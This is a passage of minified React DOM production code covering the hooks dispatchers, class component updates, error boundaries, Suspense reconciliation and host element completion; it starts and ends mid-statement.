s=e.alternate;if(e.lanes===0&&(s===null||s.lanes===0)&&(s=t.lastRenderedReducer,s!==null))try{var u=t.lastRenderedState,p=s(u,n);if(i.hasEagerState=!0,i.eagerState=p,dt(p,u)){var f=t.interleaved;f===null?(i.next=i,oo(t)):(i.next=f.next,f.next=i),t.interleaved=i;return}}catch{}finally{}n=Ka(e,t,i,r),n!==null&&(i=Me(),gt(n,e,r,i),ku(n,t,r))}}function yu(e){var t=e.alternate;return e===he||t!==null&&t===he}function vu(e,t){Pr=Ci=!0;var n=e.pending;n===null?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function ku(e,t,n){if((n&4194240)!==0){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,xs(e,n)}}var Ri={readContext:it,useCallback:Ie,useContext:Ie,useEffect:Ie,useImperativeHandle:Ie,useInsertionEffect:Ie,useLayoutEffect:Ie,useMemo:Ie,useReducer:Ie,useRef:Ie,useState:Ie,useDebugValue:Ie,useDeferredValue:Ie,useTransition:Ie,useMutableSource:Ie,useSyncExternalStore:Ie,useId:Ie,unstable_isNewReconciler:!1},wp={readContext:it,useCallback:function(e,t){return Et().memoizedState=[e,t===void 0?null:t],e},useContext:it,useEffect:au,useImperativeHandle:function(e,t,n){return n=n!=null?n.concat([e]):null,bi(4194308,4,du.bind(null,t,e),n)},useLayoutEffect:function(e,t){return bi(4194308,4,e,t)},useInsertionEffect:function(e,t){return bi(4,2,e,t)},useMemo:function(e,t){var n=Et();return t=t===void 0?null:t,e=e(),n.memoizedState=[e,t],e},useReducer:function(e,t,n){var r=Et();return t=n!==void 0?n(t):t,r.memoizedState=r.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},r.queue=e,e=e.dispatch=vp.bind(null,he,e),[r.memoizedState,e]},useRef:function(e){var t=Et();return e={current:e},t.memoizedState=e},useState:ou,useDebugValue:wo,useDeferredValue:function(e){return Et().memoizedState=e},useTransition:function(){var e=ou(!1),t=e[0];return e=yp.bind(null,e[1]),Et().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,n){var r=he,i=Et();if(pe){if(n===void 0)throw Error(l(407));n=n()}else{if(n=t(),Pe===null)throw Error(l(349));(hn&30)!==0||tu(r,t,n)}i.memoizedState=n;var s={value:n,getSnapshot:t};return i.queue=s,au(ru.bind(null,r,s,e),[e]),r.flags|=2048,Ar(9,nu.bind(null,r,s,n,t),void 0,null),n},useId:function(){var e=Et(),t=Pe.identifierPrefix;if(pe){var n=jt,r=It;n=(r&~(1<<32-ct(r)-1)).toString(32)+n,t=":"+t+"R"+n,n=Cr++,0<n&&(t+="H"+n.toString(32)),t+=":"}else n=gp++,t=":"+t+"r"+n.toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},xp={readContext:it,useCallback:fu,useContext:it,useEffect:ko,useImperativeHandle:pu,useInsertionEffect:uu,useLayoutEffect:cu,useMemo:hu,useReducer:yo,useRef:lu,useState:function(){return yo(br)},useDebugValue:wo,useDeferredValue:function(e){var t=st();return mu(t,Se.memoizedState,e)},useTransition:function(){var e=yo(br)[0],t=st().memoizedState;return[e,t]},useMutableSource:Ja,useSyncExternalStore:eu,useId:gu,unstable_isNewReconciler:!1},Sp={readContext:it,useCallback:fu,useContext:it,useEffect:ko,useImperativeHandle:pu,useInsertionEffect:uu,useLayoutEffect:cu,useMemo:hu,useReducer:vo,useRef:lu,useState:function(){return vo(br)},useDebugValue:wo,useDeferredValue:function(e){var t=st();return Se===null?t.memoizedState=e:mu(t,Se.memoizedState,e)},useTransition:function(){var e=vo(br)[0],t=st().memoizedState;return[e,t]},useMutableSource:Ja,useSyncExternalStore:eu,useId:gu,unstable_isNewReconciler:!1};function ft(e,t){if(e&&e.defaultProps){t=M({},t),e=e.defaultProps;for(var n in e)t[n]===void 0&&(t[n]=e[n]);return t}return t}function xo(e,t,n,r){t=e.memoizedState,n=n(r,t),n=n==null?t:M({},t,n),e.memoizedState=n,e.lanes===0&&(e.updateQueue.baseState=n)}var Ii={isMounted:function(e){return(e=e._reactInternals)?ln(e)===e:!1},enqueueSetState:function(e,t,n){e=e._reactInternals;var r=Me(),i=en(e),s=Nt(r,i);s.payload=t,n!=null&&(s.callback=n),t=Yt(e,s,i),t!==null&&(gt(t,e,i,r),_i(t,e,i))},enqueueReplaceState:function(e,t,n){e=e._reactInternals;var r=Me(),i=en(e),s=Nt(r,i);s.tag=1,s.payload=t,n!=null&&(s.callback=n),t=Yt(e,s,i),t!==null&&(gt(t,e,i,r),_i(t,e,i))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var n=Me(),r=en(e),i=Nt(n,r);i.tag=2,t!=null&&(i.callback=t),t=Yt(e,i,r),t!==null&&(gt(t,e,r,n),_i(t,e,r))}};function wu(e,t,n,r,i,s,u){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(r,s,u):t.prototype&&t.prototype.isPureReactComponent?!mr(n,r)||!mr(i,s):!0}function xu(e,t,n){var r=!1,i=Qt,s=t.contextType;return typeof s=="object"&&s!==null?s=it(s):(i=Ue(t)?un:Re.current,r=t.contextTypes,s=(r=r!=null)?Dn(e,i):Qt),t=new t(n,s),e.memoizedState=t.state!==null&&t.state!==void 0?t.state:null,t.updater=Ii,e.stateNode=t,t._reactInternals=e,r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=i,e.__reactInternalMemoizedMaskedChildContext=s),t}function Su(e,t,n,r){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(n,r),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(n,r),t.state!==e&&Ii.enqueueReplaceState(t,t.state,null)}function So(e,t,n,r){var i=e.stateNode;i.props=n,i.state=e.memoizedState,i.refs={},lo(e);var s=t.contextType;typeof s=="object"&&s!==null?i.context=it(s):(s=Ue(t)?un:Re.current,i.context=Dn(e,s)),i.state=e.memoizedState,s=t.getDerivedStateFromProps,typeof s=="function"&&(xo(e,t,s,n),i.state=e.memoizedState),typeof t.getDerivedStateFromProps=="function"||typeof i.getSnapshotBeforeUpdate=="function"||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(t=i.state,typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount(),t!==i.state&&Ii.enqueueReplaceState(i,i.state,null),Ei(e,n,i,r),i.state=e.memoizedState),typeof i.componentDidMount=="function"&&(e.flags|=4194308)}function Hn(e,t){try{var n="",r=t;do n+=J(r),r=r.return;while(r);var i=n}catch(s){i=`
Error generating stack: `+s.message+`
`+s.stack}return{value:e,source:t,stack:i,digest:null}}function _o(e,t,n){return{value:e,source:null,stack:n??null,digest:t??null}}function Eo(e,t){try{console.error(t.value)}catch(n){setTimeout(function(){throw n})}}var _p=typeof WeakMap=="function"?WeakMap:Map;function _u(e,t,n){n=Nt(-1,n),n.tag=3,n.payload={element:null};var r=t.value;return n.callback=function(){Oi||(Oi=!0,$o=r),Eo(e,t)},n}function Eu(e,t,n){n=Nt(-1,n),n.tag=3;var r=e.type.getDerivedStateFromError;if(typeof r=="function"){var i=t.value;n.payload=function(){return r(i)},n.callback=function(){Eo(e,t)}}var s=e.stateNode;return s!==null&&typeof s.componentDidCatch=="function"&&(n.callback=function(){Eo(e,t),typeof r!="function"&&(Zt===null?Zt=new Set([this]):Zt.add(this));var u=t.stack;this.componentDidCatch(t.value,{componentStack:u!==null?u:""})}),n}function Tu(e,t,n){var r=e.pingCache;if(r===null){r=e.pingCache=new _p;var i=new Set;r.set(t,i)}else i=r.get(t),i===void 0&&(i=new Set,r.set(t,i));i.has(n)||(i.add(n),e=Mp.bind(null,e,t,n),t.then(e,e))}function Pu(e){do{var t;if((t=e.tag===13)&&(t=e.memoizedState,t=t!==null?t.dehydrated!==null:!0),t)return e;e=e.return}while(e!==null);return null}function Cu(e,t,n,r,i){return(e.mode&1)===0?(e===t?e.flags|=65536:(e.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(t=Nt(-1,1),t.tag=2,Yt(n,t,1))),n.lanes|=1),e):(e.flags|=65536,e.lanes=i,e)}var Ep=Ee.ReactCurrentOwner,We=!1;function De(e,t,n,r){t.child=e===null?Qa(t,null,n,r):Fn(t,e.child,n,r)}function bu(e,t,n,r,i){n=n.render;var s=t.ref;return Un(t,i),r=mo(e,t,n,r,s,i),n=go(),e!==null&&!We?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~i,zt(e,t,i)):(pe&&n&&Xs(t),t.flags|=1,De(e,t,r,i),t.child)}function Au(e,t,n,r,i){if(e===null){var s=n.type;return typeof s=="function"&&!Vo(s)&&s.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(t.tag=15,t.type=s,Ru(e,t,s,r,i)):(e=Hi(n.type,null,r,t,t.mode,i),e.ref=t.ref,e.return=t,t.child=e)}if(s=e.child,(e.lanes&i)===0){var u=s.memoizedProps;if(n=n.compare,n=n!==null?n:mr,n(u,r)&&e.ref===t.ref)return zt(e,t,i)}return t.flags|=1,e=nn(s,r),e.ref=t.ref,e.return=t,t.child=e}function Ru(e,t,n,r,i){if(e!==null){var s=e.memoizedProps;if(mr(s,r)&&e.ref===t.ref)if(We=!1,t.pendingProps=r=s,(e.lanes&i)!==0)(e.flags&131072)!==0&&(We=!0);else return t.lanes=e.lanes,zt(e,t,i)}return To(e,t,n,r,i)}function Iu(e,t,n){var r=t.pendingProps,i=r.children,s=e!==null?e.memoizedState:null;if(r.mode==="hidden")if((t.mode&1)===0)t.memoizedState={baseLanes:0,cachePool:null,transitions:null},ae(Vn,et),et|=n;else{if((n&1073741824)===0)return e=s!==null?s.baseLanes|n:n,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,ae(Vn,et),et|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=s!==null?s.baseLanes:n,ae(Vn,et),et|=r}else s!==null?(r=s.baseLanes|n,t.memoizedState=null):r=n,ae(Vn,et),et|=r;return De(e,t,i,n),t.child}function ju(e,t){var n=t.ref;(e===null&&n!==null||e!==null&&e.ref!==n)&&(t.flags|=512,t.flags|=2097152)}function To(e,t,n,r,i){var s=Ue(n)?un:Re.current;return s=Dn(t,s),Un(t,i),n=mo(e,t,n,r,s,i),r=go(),e!==null&&!We?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~i,zt(e,t,i)):(pe&&r&&Xs(t),t.flags|=1,De(e,t,n,i),t.child)}function Lu(e,t,n,r,i){if(Ue(n)){var s=!0;mi(t)}else s=!1;if(Un(t,i),t.stateNode===null)Li(e,t),xu(t,n,r),So(t,n,r,i),r=!0;else if(e===null){var u=t.stateNode,p=t.memoizedProps;u.props=p;var f=u.context,_=n.contextType;typeof _=="object"&&_!==null?_=it(_):(_=Ue(n)?un:Re.current,_=Dn(t,_));var A=n.getDerivedStateFromProps,R=typeof A=="function"||typeof u.getSnapshotBeforeUpdate=="function";R||typeof u.UNSAFE_componentWillReceiveProps!="function"&&typeof u.componentWillReceiveProps!="function"||(p!==r||f!==_)&&Su(t,u,r,_),Gt=!1;var C=t.memoizedState;u.state=C,Ei(t,r,u,i),f=t.memoizedState,p!==r||C!==f||Be.current||Gt?(typeof A=="function"&&(xo(t,n,A,r),f=t.memoizedState),(p=Gt||wu(t,n,p,r,C,f,_))?(R||typeof u.UNSAFE_componentWillMount!="function"&&typeof u.componentWillMount!="function"||(typeof u.componentWillMount=="function"&&u.componentWillMount(),typeof u.UNSAFE_componentWillMount=="function"&&u.UNSAFE_componentWillMount()),typeof u.componentDidMount=="function"&&(t.flags|=4194308)):(typeof u.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=r,t.memoizedState=f),u.props=r,u.state=f,u.context=_,r=p):(typeof u.componentDidMount=="function"&&(t.flags|=4194308),r=!1)}else{u=t.stateNode,Ga(e,t),p=t.memoizedProps,_=t.type===t.elementType?p:ft(t.type,p),u.props=_,R=t.pendingProps,C=u.context,f=n.contextType,typeof f=="object"&&f!==null?f=it(f):(f=Ue(n)?un:Re.current,f=Dn(t,f));var z=n.getDerivedStateFromProps;(A=typeof z=="function"||typeof u.getSnapshotBeforeUpdate=="function")||typeof u.UNSAFE_componentWillReceiveProps!="function"&&typeof u.componentWillReceiveProps!="function"||(p!==R||C!==f)&&Su(t,u,r,f),Gt=!1,C=t.memoizedState,u.state=C,Ei(t,r,u,i);var O=t.memoizedState;p!==R||C!==O||Be.current||Gt?(typeof z=="function"&&(xo(t,n,z,r),O=t.memoizedState),(_=Gt||wu(t,n,_,r,C,O,f)||!1)?(A||typeof u.UNSAFE_componentWillUpdate!="function"&&typeof u.componentWillUpdate!="function"||(typeof u.componentWillUpdate=="function"&&u.componentWillUpdate(r,O,f),typeof u.UNSAFE_componentWillUpdate=="function"&&u.UNSAFE_componentWillUpdate(r,O,f)),typeof u.componentDidUpdate=="function"&&(t.flags|=4),typeof u.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof u.componentDidUpdate!="function"||p===e.memoizedProps&&C===e.memoizedState||(t.flags|=4),typeof u.getSnapshotBeforeUpdate!="function"||p===e.memoizedProps&&C===e.memoizedState||(t.flags|=1024),t.memoizedProps=r,t.memoizedState=O),u.props=r,u.state=O,u.context=f,r=_):(typeof u.componentDidUpdate!="function"||p===e.memoizedProps&&C===e.memoizedState||(t.flags|=4),typeof u.getSnapshotBeforeUpdate!="function"||p===e.memoizedProps&&C===e.memoizedState||(t.flags|=1024),r=!1)}return Po(e,t,n,r,s,i)}function Po(e,t,n,r,i,s){ju(e,t);var u=(t.flags&128)!==0;if(!r&&!u)return i&&Oa(t,n,!1),zt(e,t,s);r=t.stateNode,Ep.current=t;var p=u&&typeof n.getDerivedStateFromError!="function"?null:r.render();return t.flags|=1,e!==null&&u?(t.child=Fn(t,e.child,null,s),t.child=Fn(t,null,p,s)):De(e,t,p,s),t.memoizedState=r.state,i&&Oa(t,n,!0),t.child}function Nu(e){var t=e.stateNode;t.pendingContext?Da(e,t.pendingContext,t.pendingContext!==t.context):t.context&&Da(e,t.context,!1),ao(e,t.containerInfo)}function zu(e,t,n,r,i){return $n(),to(i),t.flags|=256,De(e,t,n,r),t.child}var Co={dehydrated:null,treeContext:null,retryLane:0};function bo(e){return{baseLanes:e,cachePool:null,transitions:null}}function Du(e,t,n){var r=t.pendingProps,i=fe.current,s=!1,u=(t.flags&128)!==0,p;if((p=u)||(p=e!==null&&e.memoizedState===null?!1:(i&2)!==0),p?(s=!0,t.flags&=-129):(e===null||e.memoizedState!==null)&&(i|=1),ae(fe,i&1),e===null)return eo(t),e=t.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?((t.mode&1)===0?t.lanes=1:e.data==="$!"?t.lanes=8:t.lanes=1073741824,null):(u=r.children,e=r.fallback,s?(r=t.mode,s=t.child,u={mode:"hidden",children:u},(r&1)===0&&s!==null?(s.childLanes=0,s.pendingProps=u):s=qi(u,r,0,null),e=kn(e,r,n,null),s.return=t,e.return=t,s.sibling=e,t.child=s,t.child.memoizedState=bo(n),t.memoizedState=Co,e):Ao(t,u));if(i=e.memoizedState,i!==null&&(p=i.dehydrated,p!==null))return Tp(e,t,u,r,p,i,n);if(s){s=r.fallback,u=t.mode,i=e.child,p=i.sibling;var f={mode:"hidden",children:r.children};return(u&1)===0&&t.child!==i?(r=t.child,r.childLanes=0,r.pendingProps=f,t.deletions=null):(r=nn(i,f),r.subtreeFlags=i.subtreeFlags&14680064),p!==null?s=nn(p,s):(s=kn(s,u,n,null),s.flags|=2),s.return=t,r.return=t,r.sibling=s,t.child=r,r=s,s=t.child,u=e.child.memoizedState,u=u===null?bo(n):{baseLanes:u.baseLanes|n,cachePool:null,transitions:u.transitions},s.memoizedState=u,s.childLanes=e.childLanes&~n,t.memoizedState=Co,r}return s=e.child,e=s.sibling,r=nn(s,{mode:"visible",children:r.children}),(t.mode&1)===0&&(r.lanes=n),r.return=t,r.sibling=null,e!==null&&(n=t.deletions,n===null?(t.deletions=[e],t.flags|=16):n.push(e)),t.child=r,t.memoizedState=null,r}function Ao(e,t){return t=qi({mode:"visible",children:t},e.mode,0,null),t.return=e,e.child=t}function ji(e,t,n,r){return r!==null&&to(r),Fn(t,e.child,null,n),e=Ao(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function Tp(e,t,n,r,i,s,u){if(n)return t.flags&256?(t.flags&=-257,r=_o(Error(l(422))),ji(e,t,u,r)):t.memoizedState!==null?(t.child=e.child,t.flags|=128,null):(s=r.fallback,i=t.mode,r=qi({mode:"visible",children:r.children},i,0,null),s=kn(s,i,u,null),s.flags|=2,r.return=t,s.return=t,r.sibling=s,t.child=r,(t.mode&1)!==0&&Fn(t,e.child,null,u),t.child.memoizedState=bo(u),t.memoizedState=Co,s);if((t.mode&1)===0)return ji(e,t,u,null);if(i.data==="$!"){if(r=i.nextSibling&&i.nextSibling.dataset,r)var p=r.dgst;return r=p,s=Error(l(419)),r=_o(s,r,void 0),ji(e,t,u,r)}if(p=(u&e.childLanes)!==0,We||p){if(r=Pe,r!==null){switch(u&-u){case 4:i=2;break;case 16:i=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:i=32;break;case 536870912:i=268435456;break;default:i=0}i=(i&(r.suspendedLanes|u))!==0?0:i,i!==0&&i!==s.retryLane&&(s.retryLane=i,Lt(e,i),gt(r,e,i,-1))}return qo(),r=_o(Error(l(421))),ji(e,t,u,r)}return i.data==="$?"?(t.flags|=128,t.child=e.child,t=Op.bind(null,e),i._reactRetry=t,null):(e=s.treeContext,Je=qt(i.nextSibling),Ze=t,pe=!0,pt=null,e!==null&&(nt[rt++]=It,nt[rt++]=jt,nt[rt++]=cn,It=e.id,jt=e.overflow,cn=t),t=Ao(t,r.children),t.flags|=4096,t)}function Mu(e,t,n){e.lanes|=t;var r=e.alternate;r!==null&&(r.lanes|=t),so(e.return,t,n)}function Ro(e,t,n,r,i){var s=e.memoizedState;s===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:r,tail:n,tailMode:i}:(s.isBackwards=t,s.rendering=null,s.renderingStartTime=0,s.last=r,s.tail=n,s.tailMode=i)}function Ou(e,t,n){var r=t.pendingProps,i=r.revealOrder,s=r.tail;if(De(e,t,r.children,n),r=fe.current,(r&2)!==0)r=r&1|2,t.flags|=128;else{if(e!==null&&(e.flags&128)!==0)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Mu(e,n,t);else if(e.tag===19)Mu(e,n,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}r&=1}if(ae(fe,r),(t.mode&1)===0)t.memoizedState=null;else switch(i){case"forwards":for(n=t.child,i=null;n!==null;)e=n.alternate,e!==null&&Ti(e)===null&&(i=n),n=n.sibling;n=i,n===null?(i=t.child,t.child=null):(i=n.sibling,n.sibling=null),Ro(t,!1,i,n,s);break;case"backwards":for(n=null,i=t.child,t.child=null;i!==null;){if(e=i.alternate,e!==null&&Ti(e)===null){t.child=i;break}e=i.sibling,i.sibling=n,n=i,i=e}Ro(t,!0,n,null,s);break;case"together":Ro(t,!1,null,null,void 0);break;default:t.memoizedState=null}return t.child}function Li(e,t){(t.mode&1)===0&&e!==null&&(e.alternate=null,t.alternate=null,t.flags|=2)}function zt(e,t,n){if(e!==null&&(t.dependencies=e.dependencies),mn|=t.lanes,(n&t.childLanes)===0)return null;if(e!==null&&t.child!==e.child)throw Error(l(153));if(t.child!==null){for(e=t.child,n=nn(e,e.pendingProps),t.child=n,n.return=t;e.sibling!==null;)e=e.sibling,n=n.sibling=nn(e,e.pendingProps),n.return=t;n.sibling=null}return t.child}function Pp(e,t,n){switch(t.tag){case 3:Nu(t),$n();break;case 5:Za(t);break;case 1:Ue(t.type)&&mi(t);break;case 4:ao(t,t.stateNode.containerInfo);break;case 10:var r=t.type._context,i=t.memoizedProps.value;ae(xi,r._currentValue),r._currentValue=i;break;case 13:if(r=t.memoizedState,r!==null)return r.dehydrated!==null?(ae(fe,fe.current&1),t.flags|=128,null):(n&t.child.childLanes)!==0?Du(e,t,n):(ae(fe,fe.current&1),e=zt(e,t,n),e!==null?e.sibling:null);ae(fe,fe.current&1);break;case 19:if(r=(n&t.childLanes)!==0,(e.flags&128)!==0){if(r)return Ou(e,t,n);t.flags|=128}if(i=t.memoizedState,i!==null&&(i.rendering=null,i.tail=null,i.lastEffect=null),ae(fe,fe.current),r)break;return null;case 22:case 23:return t.lanes=0,Iu(e,t,n)}return zt(e,t,n)}var $u,Io,Fu,Bu;$u=function(e,t){for(var n=t.child;n!==null;){if(n.tag===5||n.tag===6)e.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===t)break;for(;n.sibling===null;){if(n.return===null||n.return===t)return;n=n.return}n.sibling.return=n.return,n=n.sibling}},Io=function(){},Fu=function(e,t,n,r){var i=e.memoizedProps;if(i!==r){e=t.stateNode,fn(_t.current);var s=null;switch(n){case"input":i=ss(e,i),r=ss(e,r),s=[];break;case"select":i=M({},i,{value:void 0}),r=M({},r,{value:void 0}),s=[];break;case"textarea":i=as(e,i),r=as(e,r),s=[];break;default:typeof i.onClick!="function"&&typeof r.onClick=="function"&&(e.onclick=pi)}cs(n,r);var u;n=null;for(_ in i)if(!r.hasOwnProperty(_)&&i.hasOwnProperty(_)&&i[_]!=null)if(_==="style"){var p=i[_];for(u in p)p.hasOwnProperty(u)&&(n||(n={}),n[u]="")}else _!=="dangerouslySetInnerHTML"&&_!=="children"&&_!=="suppressContentEditableWarning"&&_!=="suppressHydrationWarning"&&_!=="autoFocus"&&(c.hasOwnProperty(_)?s||(s=[]):(s=s||[]).push(_,null));for(_ in r){var f=r[_];if(p=i!=null?i[_]:void 0,r.hasOwnProperty(_)&&f!==p&&(f!=null||p!=null))if(_==="style")if(p){for(u in p)!p.hasOwnProperty(u)||f&&f.hasOwnProperty(u)||(n||(n={}),n[u]="");for(u in f)f.hasOwnProperty(u)&&p[u]!==f[u]&&(n||(n={}),n[u]=f[u])}else n||(s||(s=[]),s.push(_,n)),n=f;else _==="dangerouslySetInnerHTML"?(f=f?f.__html:void 0,p=p?p.__html:void 0,f!=null&&p!==f&&(s=s||[]).push(_,f)):_==="children"?typeof f!="string"&&typeof f!="number"||(s=s||[]).push(_,""+f):_!=="suppressContentEditableWarning"&&_!=="suppressHydrationWarning"&&(c.hasOwnProperty(_)?(f!=null&&_==="onScroll"&&ue("scroll",e),s||p===f||(s=[])):(s=s||[]).push(_,f))}n&&(s=s||[]).push("style",n);var _=s;(t.updateQueue=_)&&(t.flags|=4)}},Bu=function(e,t,n,r){n!==r&&(t.flags|=4)};function Rr(e,t){if(!pe)switch(e.tailMode){case"hidden":t=e.tail;for(var n=null;t!==null;)t.alternate!==null&&(n=t),t=t.sibling;n===null?e.tail=null:n.sibling=null;break;case"collapsed":n=e.tail;for(var r=null;n!==null;)n.alternate!==null&&(r=n),n=n.sibling;r===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:r.sibling=null}}function je(e){var t=e.alternate!==null&&e.alternate.child===e.child,n=0,r=0;if(t)for(var i=e.child;i!==null;)n|=i.lanes|i.childLanes,r|=i.subtreeFlags&14680064,r|=i.flags&14680064,i.return=e,i=i.sibling;else for(i=e.child;i!==null;)n|=i.lanes|i.childLanes,r|=i.subtreeFlags,r|=i.flags,i.return=e,i=i.sibling;return e.subtreeFlags|=r,e.childLanes=n,t}function Cp(e,t,n){var r=t.pendingProps;switch(Zs(t),t.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return je(t),null;case 1:return Ue(t.type)&&hi(),je(t),null;case 3:return r=t.stateNode,Wn(),ce(Be),ce(Re),po(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(e===null||e.child===null)&&(ki(t)?t.flags|=4:e===null||e.memoizedState.isDehydrated&&(t.flags&256)===0||(t.flags|=1024,pt!==null&&(Uo(pt),pt=null))),Io(e,t),je(t),null;case 5:uo(t);var i=fn(Tr.current);if(n=t.type,e!==null&&t.stateNode!=null)Fu(e,t,n,r,i),e.ref!==t.ref&&(t.flags|=512,t.flags|=2097152);else{if(!r){if(t.stateNode===null)throw Error(l(166));return je(t),null}if(e=fn(_t.current),ki(t)){r=t.stateNode,n=t.type;var s=t.memoizedProps;switch(r[St]=t,r[wr]=s,e=(t.mode&1)!==0,n){case"dialog":ue("cancel",r),ue("close",r);break;case"iframe":case"object":case"embed":ue("load",r);break;case"video":case"audio":for(i=0;i<yr.length;i++)ue(yr[i],r);break;case"source":ue("error",r);break;case"img":case"image":case"link":ue("error",r),ue("load",r);break;case"details":ue("toggle",r);break;case"input":xl(r,s),ue("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!s.multiple},ue("invalid",r);break;case"textarea":El(r,s),ue("invalid",r)}cs(n,s),i=null;for(var u in s)if(s.hasOwnProperty(u)){var p=s[u];u==="children"?typeof p=="string"?r.textContent!==p&&(s.suppressHydrationWarning!==!0&&di(r.textContent,p,e),i=["children",p]):typeof p=="number"&&r.textContent!==""+p&&(s.suppressHydrationWarning!==!0&&di(r.textContent,p,e),i=["children",""+p]):c.hasOwnProperty(u)&&p!=null&&u==="onScroll"&&ue("scroll",r)}switch(n){case"input":Ur(r),_l(r,s,!0);break;case"textarea":Ur(r),Pl(r);break;case"select":case"option":break;default:typeof s.onClick=="function"&&(r.onclick=pi)}r=i,t.updateQueue=r,r!==null&&(t.flags|=4)}else{u=i.nodeType===9?i:i.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Cl(n)),e==="http://www.w3.org/1999/xhtml"?n==="script"?(e=u.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof r.is=="string"?e=u.createElement(n,{is:r.is}):(e=u.createElement(n),n==="select"&&(u=e,r.multiple?u.multiple=!0:r.size&&(u.size=r.size))):e=u.createElementNS(e,n),e[St]=t,e[wr]=r,$u(e,t,!1,!1),t.stateNode=e;e:{switch(u=ds(n,r),n){case"dialog":ue("cancel",e),ue("close",e),i=r;break;case"iframe":case"object":case"embed":ue("load",e),i=r;break;case"video":case"audio":for(i=0;i<yr.length;i++)ue(yr[i],e);i=r;break;case"source":ue("error",e),i=r;break;case"img":case"image":case"link":ue("error",e),ue("load",e),i=r;break;case"details":ue("toggle",e),i=r;break;case"input":xl(e,r),i=ss(e,r),ue("invalid",e);break;case"option":i=r;break;case"select":e._wrapperState={wasMultiple:!!r.multiple},i=M({},r,{value:void 0}),ue("invalid",e);break;case"textarea":El(e,r),i=as(e,r),ue("invalid",e);break;default:i=r}cs(n,i),p=i;for(s in p)if(p.hasOwnProperty(s)){var f=p[s];s==="style"?Rl(e,f):s==="dangerouslySetInnerHTML"?(f=f?f.__html:void 0,f!=null&&bl(e,f)):s==="children"?typeof f=="string"?(n!=="textarea"||f!=="")&&Zn(e,f):typeof f=="number"&&Zn(e,""+f):s!=="suppressContentEditableWarning"&&s!=="suppressHydrationWarning"&&s!=="autoFocus"&&(c.hasOwnProperty(s)?f!=null&&s==="onScroll"&&ue("scroll",e):f!=null&&Ke(e,s,f,u))}switch(n){case"input":Ur(e),_l(e,r,!1);break;case"textarea":Ur(e),Pl(e);break;case"option":r.value!=null&&e.setAttribute("value",""+ne(r.value));break;case"select":e.multiple=!!r.multiple,s=r.value,s!=null?En(e,!!r.multiple,s,!1):r.defaultValue!=null&&En(e,!!r.multiple,r.defaultValue,!0);break;default:typeof i.onClick=="function"&&(e.onclick=pi)}switch(n){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(t.flags|=4)}t.ref!==null&&(t.flags|=512,t.flags|=2097152)}return je(t),null;case 6:if(e&&t.stateNode!=null)Bu(e,t,e.memoizedProps,r);else{if(typeof r!="string"&&t.stateNode===null)throw Error(l(166));if(n=fn(Tr.current),fn(_t.current),ki(t)){if(r=t.stateNode,n=t.memoizedProps,r[St]=t,(s=r.nodeValue!==n)&&(e=Ze,e!==null))switch(e.tag){case 3:di(r.nodeValue,n,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&di(r.nodeValue,n,(e.mode&1)!==0)}s&&(t.flags|=4)}else r=(n.nodeType===9?n:n.ownerDocument).createTextNode(r),r[St]=t,t.stateNode=r}return je(t),null;case 13:if(ce(fe),r=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(pe&&Je!==null&&(t.mode&1)!==0&&(t.flags&128)===0)Ha(),$n(),t.flags|=98560,s=!1;else if(s=ki(t),r!==null&&r.dehydrated!==null){if(e===null){if(!s)throw Error(l(318));if(s=t.memoizedState,s=s!==null?s.dehydrated:null,!s)throw Error(l(317));s[St]=t}else $n(),(t.flags&128)===0&&(t.memoizedState=null),t.flags|=4;je(t),s=!1}else pt!==null&&(Uo(pt),pt=null),s=!0;if(!s)return 